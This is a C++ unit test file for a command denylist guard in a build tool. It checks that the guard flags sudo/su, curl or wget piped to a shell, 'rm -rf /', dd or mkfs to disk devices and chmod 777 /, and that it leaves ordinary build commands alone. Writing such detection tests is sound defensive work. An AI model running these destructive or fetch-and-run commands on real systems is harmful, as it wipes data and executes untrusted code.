// Tests for validate.h (stage 4.1): the denylist guard. Shape checks
// (an empty denylist is itself the bug, §11) plus the behaviors that
// matter: cross-argument matches, no false positives on ordinary build
// commands, and path arguments that are innocent.

#include "berth/validate.h"

#include <algorithm>
#include <string>
#include <string_view>
#include <vector>

#include "runner.h"

using berth::denylist_size;
using berth::matched_dangerous_patterns;

namespace {

bool matches(const std::vector<std::string>& argv, const std::string& rule) {
  const std::vector<std::string> got = matched_dangerous_patterns(argv);
  return std::find(got.begin(), got.end(), rule) != got.end();
}

bool matches(const std::string_view line, const std::string& rule) {
  const std::vector<std::string> got = matched_dangerous_patterns(line);
  return std::find(got.begin(), got.end(), rule) != got.end();
}

}  // namespace

TEST(denylist_is_not_empty) {
  CHECK(denylist_size() >= 5);
}

TEST(denylist_catches_privilege_escalation) {
  CHECK(matches({"sudo", "make", "install"}, "sudo-or-su"));
  CHECK(matches({"su", "-c", "id"}, "sudo-or-su"));
  CHECK(matches(
      std::vector<std::string>{"curl", "-fsSL", "https://get.example|sh"},
      "pipe-to-shell"));
  CHECK(matches(
      std::vector<std::string>{"wget", "-qO-", "https://get.example|bash"},
      "pipe-to-shell"));
}

TEST(denylist_catches_root_destruction_across_argv_elements) {
  // No single element matches; only the joined line does. This is the
  // case a per-argument guard misses.
  CHECK(matches({"rm", "-rf", "/"}, "rm-root"));
  CHECK(matches({"rm", "-r", "-f", "~"}, "rm-root"));
  CHECK(matches(std::string_view("rm -rf $HOME"), "rm-root"));
  CHECK(matches({"dd", "if=disk.img", "of=/dev/sda"}, "dd-to-device"));
  CHECK(matches(std::string_view("mkfs.ext4 /dev/sdb1"), "mkfs"));
  CHECK(matches(std::vector<std::string>{"cat", "image", ">", "/dev/nvme0n1"},
                "redirect-block-device"));
  CHECK(matches(std::string_view("chmod 777 /"), "chmod-777-root"));
}

TEST(denylist_leaves_ordinary_build_commands_alone) {
  const std::vector<std::vector<std::string>> benign = {
      {"go", "build", "./..."},
      {"bun", "install", "--frozen-lockfile"},
      {"pnpm", "run", "build"},
      {"python3", "-m", "pip", "install", "-r", "requirements.txt"},
      {"cmake", "-B", "build", "-DCMAKE_BUILD_TYPE=Release"},
      {"rm", "-rf", "./build"},
      {"rm", "-rf", "/tmp/build/berthpanel"},
      {"rm", "dist/app.js"},
      {"curl", "-o", "plugin.js", "https://cdn.jsdelivr.net/npm/x"},
      {"sed", "-i", "s/a/b/", "file.txt"},
  };
  for (const std::vector<std::string>& argv : benign) {
    CHECK(matched_dangerous_patterns(argv).empty());
  }
}

TEST(denylist_does_not_trip_on_substrings) {
  CHECK(matched_dangerous_patterns(std::string_view("pseudo-stdio")).empty());
  CHECK(matched_dangerous_patterns(std::string_view("sh")).empty());
  CHECK(matched_dangerous_patterns(std::string_view("resumes")).empty());
  CHECK(matched_dangerous_patterns(std::string_view("mkfsx")).empty());
}
